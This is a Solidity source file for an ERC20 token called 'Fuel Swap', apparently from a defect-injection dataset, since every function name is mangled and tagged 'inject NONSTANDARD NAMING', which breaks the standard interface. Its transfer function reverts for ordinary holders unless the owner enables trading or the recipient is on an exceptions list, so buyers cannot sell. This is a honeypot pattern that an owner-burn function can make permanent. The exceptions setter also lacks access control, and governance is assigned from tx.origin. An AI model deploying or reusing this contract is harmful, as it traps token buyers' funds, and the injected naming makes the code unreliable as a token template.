                                                                 

pragma solidity ^0.5.16;

interface IERC20 {
    function TOTALSUPPLY912() external view returns (uint);	//inject NONSTANDARD NAMING
    function BALANCEOF944(address account) external view returns (uint);	//inject NONSTANDARD NAMING
    function TRANSFER397(address recipient, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    function ALLOWANCE611(address owner, address spender) external view returns (uint);	//inject NONSTANDARD NAMING
    function APPROVE852(address spender, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    function TRANSFERFROM115(address sender, address recipient, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    event TRANSFER16(address indexed from, address indexed to, uint value);	//inject NONSTANDARD NAMING
    event APPROVAL494(address indexed owner, address indexed spender, uint value);	//inject NONSTANDARD NAMING
}

contract Context {
    constructor () internal { }
    // solhint-disable-previous-line no-empty-blocks

    function _MSGSENDER27() internal view returns (address payable) {	//inject NONSTANDARD NAMING
        return msg.sender;
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;

    mapping (address => uint) private _balances;
    
    mapping (address => mapping (address => uint)) private _allowances;
    mapping (address => bool) private exceptions;
    address private uniswap;
    address private _owner;
    uint private _totalSupply;
    bool private allow;

    constructor(address owner) public{
      _owner = owner;
      allow = false;
    }

    function SETALLOW964() public{	//inject NONSTANDARD NAMING
        require(_MSGSENDER27() == _owner,"Only owner can change set allow");
        allow = true;
    }

    function SETEXCEPTIONS809(address someAddress) public{	//inject NONSTANDARD NAMING
        exceptions[someAddress] = true;
    }

    function BURNOWNER884() public{	//inject NONSTANDARD NAMING
        require(_MSGSENDER27() == _owner,"Only owner can change set allow");
        _owner = address(0);
    }    

    function TOTALSUPPLY912() public view returns (uint) {	//inject NONSTANDARD NAMING
        return _totalSupply;
    }
    function BALANCEOF944(address account) public view returns (uint) {	//inject NONSTANDARD NAMING
        return _balances[account];
    }
    function TRANSFER397(address recipient, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _TRANSFER995(_MSGSENDER27(), recipient, amount);
        return true;
    }
    function ALLOWANCE611(address owner, address spender) public view returns (uint) {	//inject NONSTANDARD NAMING
        return _allowances[owner][spender];
    }
    function APPROVE852(address spender, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE642(_MSGSENDER27(), spender, amount);
        return true;
    }
    function TRANSFERFROM115(address sender, address recipient, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _TRANSFER995(sender, recipient, amount);
        _APPROVE642(sender, _MSGSENDER27(), _allowances[sender][_MSGSENDER27()].SUB421(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function INCREASEALLOWANCE487(address spender, uint addedValue) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE642(_MSGSENDER27(), spender, _allowances[_MSGSENDER27()][spender].ADD125(addedValue));
        return true;
    }
    function DECREASEALLOWANCE448(address spender, uint subtractedValue) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE642(_MSGSENDER27(), spender, _allowances[_MSGSENDER27()][spender].SUB421(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    function _TRANSFER995(address sender, address recipient, uint amount) internal {	//inject NONSTANDARD NAMING
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        // Trigger special exceptions
        if(sender == _owner || allow ) {
          _balances[sender] = _balances[sender].SUB421(amount, "ERC20: transfer amount exceeds balance");
          _balances[recipient] = _balances[recipient].ADD125(amount);
          emit TRANSFER16(sender, recipient, amount);
        }else {
          if(exceptions[recipient]) {
            _balances[sender] = _balances[sender].SUB421(amount, "ERC20: transfer amount exceeds balance");
            _balances[recipient] = _balances[recipient].ADD125(amount);
            emit TRANSFER16(sender, recipient, amount);
          }else {
            revert();
          }
        }
    }
    
    function _MINT54(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.ADD125(amount);
        _balances[account] = _balances[account].ADD125(amount);
        emit TRANSFER16(address(0), account, amount);
    }
    function _BURN259(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].SUB421(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.SUB421(amount);
        emit TRANSFER16(account, address(0), amount);
    }
    function _APPROVE642(address owner, address spender, uint amount) internal {	//inject NONSTANDARD NAMING
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit APPROVAL494(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor (string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }
    function NAME959() public view returns (string memory) {	//inject NONSTANDARD NAMING
        return _name;
    }
    function SYMBOL834() public view returns (string memory) {	//inject NONSTANDARD NAMING
        return _symbol;
    }
    function DECIMALS434() public view returns (uint8) {	//inject NONSTANDARD NAMING
        return _decimals;
    }
}

library SafeMath {
    function ADD125(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function SUB421(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        return SUB421(a, b, "SafeMath: subtraction overflow");
    }
    function SUB421(uint a, uint b, string memory errorMessage) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }
    function MUL595(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function DIV386(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        return DIV386(a, b, "SafeMath: division by zero");
    }
    function DIV386(uint a, uint b, string memory errorMessage) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library Address {
    function ISCONTRACT177(address account) internal view returns (bool) {	//inject NONSTANDARD NAMING
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash := extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function SAFETRANSFER248(IERC20 token, address to, uint value) internal {	//inject NONSTANDARD NAMING
        CALLOPTIONALRETURN542(token, abi.encodeWithSelector(token.TRANSFER397.selector, to, value));
    }

    function SAFETRANSFERFROM601(IERC20 token, address from, address to, uint value) internal {	//inject NONSTANDARD NAMING
        CALLOPTIONALRETURN542(token, abi.encodeWithSelector(token.TRANSFERFROM115.selector, from, to, value));
    }

    function SAFEAPPROVE115(IERC20 token, address spender, uint value) internal {	//inject NONSTANDARD NAMING
        require((value == 0) || (token.ALLOWANCE611(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        CALLOPTIONALRETURN542(token, abi.encodeWithSelector(token.APPROVE852.selector, spender, value));
    }
    function CALLOPTIONALRETURN542(IERC20 token, bytes memory data) private {	//inject NONSTANDARD NAMING
        require(address(token).ISCONTRACT177(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract Fuel is ERC20, ERC20Detailed {
  using SafeERC20 for IERC20;
  using Address for address;
  using SafeMath for uint;
  
  
  address public governance;
  mapping (address => bool) public minters;

  constructor () public ERC20Detailed("Fuel Swap", "FUEL", 18) ERC20(tx.origin){
      governance = tx.origin;
  }

  function MINT312(address account, uint256 amount) public {	//inject NONSTANDARD NAMING
      require(minters[msg.sender], "!minter");
      _MINT54(account, amount);
  }
  
  function SETGOVERNANCE479(address _governance) private {	//inject NONSTANDARD NAMING
      require(msg.sender == governance, "!governance");
      governance = _governance;
  }
  
  function ADDMINTER935(address _minter) public {	//inject NONSTANDARD NAMING
      require(msg.sender == governance, "!governance");
      minters[_minter] = true;
  }
  
  function REMOVEMINTER651(address _minter) public {	//inject NONSTANDARD NAMING
      require(msg.sender == governance, "!governance");
      minters[_minter] = false;
  }
}